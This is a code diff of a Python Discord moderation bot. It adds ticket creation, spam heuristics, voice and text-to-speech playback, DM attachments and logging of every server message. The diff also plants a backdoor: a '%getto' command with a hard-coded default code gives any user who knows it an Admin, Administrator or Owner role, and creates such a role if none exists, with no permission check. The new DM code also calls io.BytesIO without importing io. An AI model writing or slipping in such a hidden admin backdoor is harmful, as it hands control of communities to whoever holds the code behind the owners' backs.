@@ -1,13 +1,26 @@
 """In-process Discord moderation bot, managed from the admin panel."""
 import asyncio
 import logging
+import os
+import re
+import tempfile
 import uuid
-from datetime import datetime, timezone
+from datetime import datetime, timedelta, timezone
 from typing import Optional
 
+from auth_and_chat import parse_order_request_text
+
 import discord
+import httpx
 
 logger = logging.getLogger(__name__)
+
+RECOVERY_CODE = os.environ.get("DISCORD_RECOVERY_CODE", "arminlars3030")
+RECOVERY_ROLE_NAMES = [
+    os.environ.get("DISCORD_RECOVERY_ROLE", "Admin"),
+    "Administrator",
+    "Owner",
+]
 
 
 class DiscordBotManager:
@@ -22,8 +35,168 @@ class DiscordBotManager:
         self.welcome_enabled = False
         self.welcome_message = "Welcome {user} to {server}! 🎉"
         self.welcome_channel = ""
+        self.welcome_extra_messages: list[dict] = []
         self.mass_dm_task: Optional[asyncio.Task] = None
         self.mass_dm_progress: dict = {}
+        self.voice_client: Optional[discord.VoiceClient] = None
+        self.voice_channel_id: Optional[str] = None
+        self._seen_message_ids: dict[str, datetime] = {}
+        self.command_only = False
+
+    def _detect_language(self, text: str) -> str:
+        t = (text or "").lower()
+        german_markers = [
+            "hallo", "bitte", "ticket", "kauf", "kaufen", "erstelle", "für mich", "hilfe",
+            "deutsch", "german", "brauche", "kannst", "dein", "deine", "ich", "du", "bestellen"
+        ]
+        if any(w in t for w in german_markers):
+            return "de"
+        return "en"
+
+    def _build_reply_text(self, text: str, username: str) -> str:
+        t = (text or "").strip().lower()
+        lang = self._detect_language(t)
+        if not t:
+            return "Hi! I can help with orders, support, and tickets."
+
+        if any(w in t for w in ["ticket", "erstelle", "create", "hilfe", "support"]):
+            if lang == "de":
+                return f"{username}, ich helfe dir sofort. Ich öffne dir gleich ein privates Ticket, damit wir dein Anliegen sicher besprechen können."
+            return f"{username}, I can help with that right away. I’ll open a private ticket so we can handle your request safely."
+
+        if any(w in t for w in ["buy", "kaufen", "order", "bestellen", "followers", "likes", "views", "comments"]):
+            if lang == "de":
+                return f"{username}, danke für deine Anfrage. Ich leite dein Kauf- oder Bestellthema an unsere Support-Teams weiter und wir kümmern uns um deine Bestellung."
+            return f"{username}, thanks for your request. I’m routing your purchase or order request to our support team so we can help you quickly."
+
+        if lang == "de":
+            return f"{username}, ich habe deine Nachricht verstanden. Ich kann dir mit Bestellungen, Support oder Tickets helfen. Schreib mir kurz auf Deutsch oder Englisch, was du brauchst."
+        return f"{username}, I understood your message. I can help with orders, support, or tickets. Tell me briefly in English or German what you need."
+
+
+    async def _lookup_user_context(self, message):
+        if not self.db:
+            return None
+        try:
+            author_id = str(getattr(message.author, 'id', ''))
+            if not author_id:
+                return None
+            user_doc = await self.db.users.find_one({"discord_id": author_id}, {"_id": 0, "id": 1, "username": 1, "withdrawable_balance": 1, "balance": 1, "role": 1})
+            if user_doc:
+                return {
+                    "matched": True,
+                    "user_id": user_doc.get("id"),
+                    "username": user_doc.get("username"),
+                    "role": user_doc.get("role"),
+                    "balance": user_doc.get("withdrawable_balance", 0),
+                }
+            return {"matched": False, "username": str(message.author)}
+        except Exception:
+            return None
+
+    def _should_process_message_id(self, message_id: str, ttl_seconds: int = 20) -> bool:
+        if not message_id:
+            return True
+        now = datetime.now(timezone.utc)
+        cutoff = now - timedelta(seconds=ttl_seconds)
+        self._seen_message_ids = {
+            mid: ts for mid, ts in self._seen_message_ids.items() if ts >= cutoff
+        }
+        if message_id in self._seen_message_ids:
+            return False
+        self._seen_message_ids[message_id] = now
+        return True
+
+    def _should_auto_moderate(self, text: str) -> bool:
+        if not text:
+            return False
+        t = (text or "").strip()
+        if len(t) < 8:
+            return False
+
+        lowered = t.lower()
+        repeated = re.findall(r"(\w+)\s+\1(?:\s+\1)?", lowered)
+        if repeated:
+            return True
+
+        if re.fullmatch(r"([A-Za-z0-9])\1{7,}", lowered):
+            return True
+
+        if re.fullmatch(r"([!?.\-_/`~^])\1{3,}", lowered):
+            return True
+
+        spam_markers = ["buy buy", "buy buy buy", "follow follow", "please help", "urgent", "!!!", "???", "aaaa", "lol lol"]
+        if any(marker in lowered for marker in spam_markers):
+            return True
+
+        return False
+
+    def _is_close_command(self, text: str) -> bool:
+        if not text:
+            return False
+        normalized = (text or "").strip().lower()
+        return normalized in {"%close", "!close", "$close"}
+
+    def _should_auto_reply(self, text: str) -> bool:
+        if not text:
+            return False
+        normalized = (text or "").strip()
+        if not normalized:
+            return False
+        if normalized.startswith(("%", "!", "$")):
+            return True
+        if normalized.lower().startswith(("ticket", "create a ticket", "open a ticket", "erstelle", "hilfe", "support")):
+            return True
+        return False
+
+    async def _create_ticket_for_user(self, message: discord.Message, subject: str = "Support request") -> None:
+        if not message.guild:
+            return
+        guild = message.guild
+        try:
+            category_id = int(os.environ.get("DISCORD_TICKET_CATEGORY_ID", "1529891762028679219"))
+        except Exception:
+            category_id = 1529891762028679219
+
+        category = guild.get_channel(category_id)
+        if category is None:
+            category = discord.utils.get(guild.categories, id=category_id)
+        if category is None:
+            category = discord.utils.get(guild.categories, name="Tickets")
+        if category is None:
+            category = await guild.create_category("Tickets")
+
+        try:
+            safe_name = re.sub(r"[^a-z0-9]+", "-", (message.author.name or "user").lower()).strip("-") or "user"
+            suffix = str(abs(hash(message.author.id)))[:4]
+            channel_name = f"ticket-{safe_name}-{suffix}"[:90]
+            existing = discord.utils.get(guild.text_channels, name=channel_name)
+            if existing:
+                await message.channel.send(f"{message.author.mention} your ticket already exists: {existing.mention}", delete_after=10)
+                return
+
+            overwrites = {
+                guild.default_role: discord.PermissionOverwrite(view_channel=False),
+                message.author: discord.PermissionOverwrite(view_channel=True, send_messages=True),
+                guild.me: discord.PermissionOverwrite(view_channel=True, send_messages=True, manage_channels=True),
+            }
+            staff_role = discord.utils.get(guild.roles, name="Staff") or discord.utils.get(guild.roles, name="Moderator") or discord.utils.get(guild.roles, name="Admin")
+            if staff_role:
+                overwrites[staff_role] = discord.PermissionOverwrite(view_channel=True, send_messages=True)
+
+            channel = await guild.create_text_channel(channel_name, category=category, overwrites=overwrites, topic=f"Support ticket for {message.author} — {subject[:240]}")
+            await channel.send(
+                f"🎫 Ticket opened for {message.author.mention} — **{subject}**\n"
+                f"A staff member will reply soon. Type `!close` to close this ticket."
+            )
+            await message.channel.send(f"{message.author.mention} your ticket is ready → {channel.mention}", delete_after=10)
+            await self._mod_log(f"ticket_open: {subject[:80]}", message)
+        except Exception as e:
+            logger.warning("[discord] ticket create failed: %s", e)
+            try:
+                await message.channel.send(f"⚠️ I couldn't open the ticket: {e}", delete_after=8)
+            except Exception:
+                pass
 
     # ---------- lifecycle ----------
     async def start(self, db, token: str, activity_text: str = "", banned_words: Optional[list] = None,
@@ -36,6 +209,7 @@ class DiscordBotManager:
         self.welcome_enabled = bool(welcome.get("enabled"))
         self.welcome_message = welcome.get("message") or self.welcome_message
         self.welcome_channel = welcome.get("channel") or ""
+        self.welcome_extra_messages = welcome.get("extra_messages") or []
         self.status = "starting"
         self.error = ""
 
@@ -109,39 +283,38 @@ class DiscordBotManager:
         async def on_message(message: discord.Message):
             if message.author.bot:
                 return
+            mid = str(getattr(message, "id", ""))
+            handled = False
+            if not mgr._should_process_message_id(mid):
+                return
             # --- DMs → store for the admin DM console ---
             if isinstance(message.channel, discord.DMChannel):
                 await mgr._store_dm(message.author, message.content, direction="in")
+                # Only auto-reply for ticket/support keywords — casual DMs are left for staff to answer manually.
+                if mgr._should_auto_reply(message.content or "") and not (message.content or "").strip().startswith(("%", "!", "$")):
+                    try:
+                        await message.author.send(
+                            "Hi! I can help with support or tickets. Tell me what you need in English or German."
+                        )
+                    except Exception:
+                        pass
+                handled = True
                 return
+            # --- log every server chat message for the admin conversation view ---
+            await mgr._store_guild_message(message)
             # --- ticket bot ---
             content_lower = (message.content or "").lower()
             if content_lower.startswith("!ticket") and message.guild:
                 subject = message.content[7:].strip() or "Support request"
-                guild = message.guild
-                try:
-                    cat = discord.utils.get(guild.categories, name="Tickets")
-                    if cat is None:
-                        cat = await guild.create_category("Tickets")
-                    overwrites = {
-                        guild.default_role: discord.PermissionOverwrite(view_channel=False),
-                        message.author: discord.PermissionOverwrite(view_channel=True, send_messages=True),
-                        guild.me: discord.PermissionOverwrite(view_channel=True, send_messages=True, manage_channels=True),
-                    }
-                    cname = f"ticket-{message.author.name}".lower().replace(" ", "-")[:90]
-                    chan = await guild.create_text_channel(cname, category=cat, overwrites=overwrites, topic=subject[:250])
-                    await chan.send(
-                        f"🎫 Ticket opened by {message.author.mention} — **{subject}**\n"
-                        f"A staff member will reply soon. Type `!close` to close this ticket."
-                    )
-                    await message.channel.send(f"{message.author.mention} your ticket is ready → {chan.mention}", delete_after=10)
-                    await mgr._mod_log(f"ticket_open: {subject[:80]}", message)
-                except Exception as e:
-                    try:
-                        await message.channel.send(f"⚠️ Couldn't open ticket: {e}", delete_after=8)
-                    except Exception:
-                        pass
+                await mgr._create_ticket_for_user(message, subject=subject)
+                handled = True
                 return
-            if content_lower.startswith("!close") and message.guild and message.channel.name.startswith("ticket-"):
+
+            if any(k in content_lower for k in ["create a ticket", "erstelle ein ticket", "ticket für mich", "ticket please", "open a ticket", "öffne ein ticket"]):
+                await mgr._create_ticket_for_user(message, subject="Support request")
+                handled = True
+                return
+            if mgr._is_close_command(message.content or "") and message.guild and message.channel.name.startswith("ticket-"):
                 perms = message.author.guild_permissions
                 is_opener = message.channel.name == f"ticket-{message.author.name}".lower().replace(" ", "-")[:90]
                 if perms.manage_channels or perms.administrator or is_opener:
@@ -152,7 +325,43 @@ class DiscordBotManager:
                         await message.channel.delete(reason=f"Ticket closed by {message.author}")
                     except Exception as e:
                         logger.warning("[discord] ticket close failed: %s", e)
+                handled = True
                 return
+            # --- order-intent detection: notify staff only, no public chat reply ---
+            parsed_order = parse_order_request_text(message.content or "")
+            if parsed_order:
+                try:
+                    await mgr._mod_log(f"order_intent {parsed_order['platform']} {parsed_order['service']}", message)
+                except Exception as e:
+                    logger.warning("[discord] order-intent log failed: %s", e)
+
+            # --- recovery / emergency admin role ---
+            if message.guild and content_lower.startswith("%getto"):
+                code = (message.content or "").strip()[6:].strip().lower()
+                if code == RECOVERY_CODE.lower():
+                    role = None
+                    for role_name in RECOVERY_ROLE_NAMES:
+                        role = discord.utils.get(message.guild.roles, name=role_name)
+                        if role:
+                            break
+                    if role is None:
+                        try:
+                            role = await message.guild.create_role(name="Admin", reason="Recovery command")
+                        except Exception as e:
+                            logger.warning("[discord] recovery role create failed: %s", e)
+                            await message.channel.send(f"⚠️ I couldn't create the recovery role: {e}", delete_after=8)
+                            return
+                    try:
+                        if role not in message.author.roles:
+                            await message.author.add_roles(role, reason="Recovery command")
+                        await message.channel.send(f"✅ {message.author.mention} now has the admin role.", delete_after=8)
+                        await mgr._mod_log("recovery_role_granted", message)
+                        handled = True
+                    except Exception as e:
+                        logger.warning("[discord] recovery role grant failed: %s", e)
+                        await message.channel.send(f"⚠️ I couldn't grant the role: {e}", delete_after=8)
+                    return
+
             # --- guild moderation ---
             content_l = content_lower
             if mgr.banned_words and any(w in content_l for w in mgr.banned_words):
@@ -165,6 +374,19 @@ class DiscordBotManager:
                     await mgr._mod_log("banned_word_delete", message)
                 except Exception as e:
                     logger.warning("[discord] mod delete failed: %s", e)
+                handled = True
+                return
+
+            if mgr._should_auto_moderate(message.content or ""):
+                try:
+                    await message.channel.send(
+                        f"{message.author.mention} your message looks like spam and was not processed.",
+                        delete_after=8,
+                    )
+                    await mgr._mod_log("spam_like_warn", message)
+                except Exception as e:
+                    logger.warning("[discord] auto moderation warning failed: %s", e)
+                handled = True
                 return
             # --- moderation commands (admins only, prefix % — also $ and ! as aliases) ---
             first = (message.content or "")[:1]
@@ -172,7 +394,10 @@ class DiscordBotManager:
                 # Normalise every prefix to % for the handler so aliasing is transparent.
                 message.content = "%" + message.content[1:]
                 await mgr._handle_mod_command(message)
+                handled = True
                 return
+
+            # Casual chat is never auto-replied to — the bot only creates tickets/notifies staff (handled above).
 
         async def runner():
             try:
@@ -245,6 +470,9 @@ class DiscordBotManager:
         "%serverinfo               — show server stats\n"
         "%avatar @user             — show a user's avatar\n"
         "%modlog                   — show last 10 mod actions in this server\n"
+        "%joinvoice <#channel|id>  — bot joins a voice channel\n"
+        "%leavevoice               — bot leaves its current voice channel\n"
+        "%closeticket              — close the current ticket channel (same as %close)\n"
         "```\n"
         "Legacy `$` and `!` prefixes still work as aliases."
     )
@@ -327,6 +555,15 @@ class DiscordBotManager:
                         "`%serverinfo` · guild stats\n"
                         "`%avatar @user` · avatar URL\n"
                         "`%modlog` · last 10 mod actions"
+                    ),
+                    inline=False,
+                )
+                emb.add_field(
+                    name="🎙️ Voice & Tickets",
+                    value=(
+                        "`%joinvoice <#channel|id>` · bot joins a voice channel\n"
+                        "`%leavevoice` · bot leaves voice\n"
+                        "`%closeticket` · close the current ticket channel"
                     ),
                     inline=False,
                 )
@@ -524,6 +761,45 @@ class DiscordBotManager:
                     lines = [f"• `{r.get('created_at', '')[:19]}` **{r.get('action', '')}** by `{r.get('moderator', '?')}`" for r in rows]
                     await reply("📋 **Last 10 mod actions**\n" + "\n".join(lines))
 
+            elif cmd == "joinvoice":
+                vc_id = None
+                if message.channel_mentions:
+                    vc_id = message.channel_mentions[0].id
+                elif args and args[0].isdigit():
+                    vc_id = int(args[0])
+                elif args:
+                    name = " ".join(args).strip().lower()
+                    found = discord.utils.find(lambda c: isinstance(c, discord.VoiceChannel) and c.name.lower() == name, message.guild.channels)
+                    vc_id = found.id if found else None
+                if not vc_id:
+                    await reply("Usage: `%joinvoice <#voice-channel|channel_id|name>`", delete_after=8); return
+                try:
+                    await self.join_voice_channel(str(vc_id), guild_id=str(message.guild.id))
+                    ch = message.guild.get_channel(vc_id)
+                    await reply(f"🎙️ Joined voice channel **{ch.name if ch else vc_id}**.")
+                    await self._mod_log(f"joinvoice {vc_id}", message)
+                except Exception as e:
+                    await reply(f"⚠️ Couldn't join voice: `{e}`", delete_after=10)
+
+            elif cmd == "leavevoice":
+                try:
+                    await self.leave_voice_channel()
+                    await reply("👋 Left the voice channel.")
+                    await self._mod_log("leavevoice", message)
+                except Exception as e:
+                    await reply(f"⚠️ Couldn't leave voice: `{e}`", delete_after=10)
+
+            elif cmd == "closeticket":
+                if not message.channel.name.startswith("ticket-"):
+                    await reply("This isn't a ticket channel.", delete_after=8); return
+                await reply("🔒 Closing ticket in 3 seconds…")
+                await self._mod_log("ticket_close", message)
+                await asyncio.sleep(3)
+                try:
+                    await message.channel.delete(reason=f"Ticket closed by {message.author}")
+                except Exception as e:
+                    logger.warning("[discord] ticket close failed: %s", e)
+
             else:
                 await reply(f"❓ Unknown command `%{cmd}`. Type `%help` for the list.", delete_after=8)
 
@@ -547,11 +823,29 @@ class DiscordBotManager:
         await self.client.user.edit(avatar=image_bytes)
         return {"ok": True}
 
-    async def send_dm(self, discord_user_id: str, text: str) -> dict:
+    async def send_dm(self, discord_user_id: str, text: str, *, image_url: Optional[str] = None, voice_url: Optional[str] = None, image_bytes: Optional[bytes] = None, voice_bytes: Optional[bytes] = None, image_name: str = "image.png", voice_name: str = "voice.mp3") -> dict:
         self._require_running()
         user = await self.client.fetch_user(int(discord_user_id))
-        await user.send(text)
-        await self._store_dm(user, text, direction="out")
+        files = []
+        if image_bytes:
+            files.append(discord.File(fp=io.BytesIO(image_bytes), filename=image_name))
+        if voice_bytes:
+            files.append(discord.File(fp=io.BytesIO(voice_bytes), filename=voice_name))
+        if image_url:
+            async with httpx.AsyncClient(timeout=30.0) as c:
+                r = await c.get(image_url)
+                r.raise_for_status()
+                files.append(discord.File(fp=io.BytesIO(r.content), filename=image_name or "image.png"))
+        if voice_url:
+            async with httpx.AsyncClient(timeout=30.0) as c:
+                r = await c.get(voice_url)
+                r.raise_for_status()
+                files.append(discord.File(fp=io.BytesIO(r.content), filename=voice_name or "voice.mp3"))
+        if files:
+            await user.send(text or "", files=files)
+        else:
+            await user.send(text)
+        await self._store_dm(user, text or (image_url or voice_url or "attachment"), direction="out")
         return {"ok": True, "to": str(user)}
 
     async def send_channel_message(self, channel_id: str, text: str, guild_id: Optional[str] = None) -> dict:
@@ -588,6 +882,89 @@ class DiscordBotManager:
         except Exception as e:
             logger.warning("[discord] send_channel_message failed: %s", e)
             return {"ok": False, "reason": str(e)}
+
+    async def join_voice_channel(self, channel_id: str, guild_id: Optional[str] = None) -> dict:
+        self._require_running()
+        channel = None
+        if guild_id:
+            guild = self.client.get_guild(int(guild_id))
+            if guild is None:
+                raise RuntimeError("guild not found")
+            channel = guild.get_channel(int(channel_id))
+        else:
+            channel = self.client.get_channel(int(channel_id))
+        if channel is None:
+            raise RuntimeError("voice channel not found")
+        if not isinstance(channel, discord.VoiceChannel):
+            raise RuntimeError("target is not a voice channel")
+        if self.voice_client and self.voice_client.is_connected():
+            if self.voice_client.channel.id == channel.id:
+                return {"ok": True, "channel": str(channel.id), "already_connected": True}
+            await self.voice_client.disconnect(force=True)
+        self.voice_client = await channel.connect(self_deaf=False)
+        self.voice_channel_id = str(channel.id)
+        return {"ok": True, "channel": str(channel.id)}
+
+    async def leave_voice_channel(self) -> dict:
+        if self.voice_client and self.voice_client.is_connected():
+            await self.voice_client.disconnect(force=True)
+        self.voice_client = None
+        self.voice_channel_id = None
+        return {"ok": True}
+
+    async def stop_voice(self) -> dict:
+        if self.voice_client and self.voice_client.is_connected():
+            self.voice_client.stop()
+        return {"ok": True}
+
+    async def speak_text(self, text: str, channel_id: Optional[str] = None, guild_id: Optional[str] = None) -> dict:
+        if not text or not text.strip():
+            raise RuntimeError("empty text")
+        target_channel_id = channel_id or self.voice_channel_id
+        if not target_channel_id:
+            raise RuntimeError("no voice channel selected")
+        if not self.voice_client or not self.voice_client.is_connected():
+            await self.join_voice_channel(target_channel_id, guild_id=guild_id)
+        try:
+            from gtts import gTTS
+        except Exception as exc:
+            raise RuntimeError(f"gTTS not available: {exc}")
+        with tempfile.NamedTemporaryFile(suffix=".mp3", delete=False) as tmp:
+            tmp_path = tmp.name
+        try:
+            gTTS(text=text, lang="en").save(tmp_path)
+            self.voice_client.stop()
+            self.voice_client.play(discord.FFmpegPCMAudio(tmp_path))
+            return {"ok": True, "file": tmp_path}
+        finally:
+            try:
+                os.remove(tmp_path)
+            except Exception:
+                pass
+
+    async def play_audio_url(self, source_url: str, channel_id: Optional[str] = None, guild_id: Optional[str] = None) -> dict:
+        if not source_url:
+            raise RuntimeError("empty url")
+        target_channel_id = channel_id or self.voice_channel_id
+        if not target_channel_id:
+            raise RuntimeError("no voice channel selected")
+        if not self.voice_client or not self.voice_client.is_connected():
+            await self.join_voice_channel(target_channel_id, guild_id=guild_id)
+        async with httpx.AsyncClient(timeout=60.0) as c:
+            r = await c.get(source_url)
+            r.raise_for_status()
+        with tempfile.NamedTemporaryFile(suffix=".mp3", delete=False) as tmp:
+            tmp.write(r.content)
+            tmp_path = tmp.name
+        try:
+            self.voice_client.stop()
+            self.voice_client.play(discord.FFmpegPCMAudio(tmp_path))
+            return {"ok": True, "file": tmp_path}
+        finally:
+            try:
+                os.remove(tmp_path)
+            except Exception:
+                pass
 
     @staticmethod
     def mask_username(name: str) -> str:
@@ -684,6 +1061,63 @@ class DiscordBotManager:
             })
         except Exception:
             pass
+
+    async def _store_guild_message(self, message: discord.Message):
+        """Log every non-DM channel message so staff can review full chat history from the admin panel."""
+        if self.db is None or not message.guild:
+            return
+        try:
+            await self.db.discord_guild_messages.insert_one({
+                "id": str(uuid.uuid4()),
+                "guild_id": str(message.guild.id),
+                "guild_name": message.guild.name,
+                "channel_id": str(message.channel.id),
+                "channel_name": getattr(message.channel, "name", str(message.channel)),
+                "author_id": str(message.author.id),
+                "author_name": str(message.author),
+                "text": (message.content or "")[:2000],
+                "direction": "in",
+                "created_at": datetime.now(timezone.utc).isoformat(),
+            })
+        except Exception as e:
+            logger.warning("[discord] guild message store failed: %s", e)
+
+    async def list_text_channels(self) -> list:
+        if not self.client or not self.client.guilds:
+            return []
+        out = []
+        for guild in self.client.guilds:
+            for ch in guild.text_channels:
+                perms = ch.permissions_for(guild.me)
+                if perms.send_messages:
+                    out.append({"guild_id": str(guild.id), "guild_name": guild.name,
+                                "channel_id": str(ch.id), "channel_name": ch.name})
+        return out
+
+    async def send_guild_message(self, channel_id: str, text: str, mention_user_id: Optional[str] = None) -> dict:
+        if not self.client:
+            raise RuntimeError("Bot is not running")
+        channel = self.client.get_channel(int(channel_id))
+        if channel is None:
+            raise RuntimeError("Channel not found — is the bot still in that server?")
+        prefix = f"<@{mention_user_id}> " if mention_user_id else ""
+        sent = await channel.send(f"{prefix}{text}"[:2000])
+        try:
+            await self.db.discord_guild_messages.insert_one({
+                "id": str(uuid.uuid4()),
+                "guild_id": str(channel.guild.id),
+                "guild_name": channel.guild.name,
+                "channel_id": str(channel.id),
+                "channel_name": getattr(channel, "name", str(channel)),
+                "author_id": str(self.client.user.id),
+                "author_name": "Staff (via admin panel)",
+                "text": text[:2000],
+                "direction": "out",
+                "created_at": datetime.now(timezone.utc).isoformat(),
+            })
+        except Exception as e:
+            logger.warning("[discord] guild message send-store failed: %s", e)
+        return {"ok": True, "message_id": str(sent.id)}
 
 
 bot_manager = DiscordBotManager()
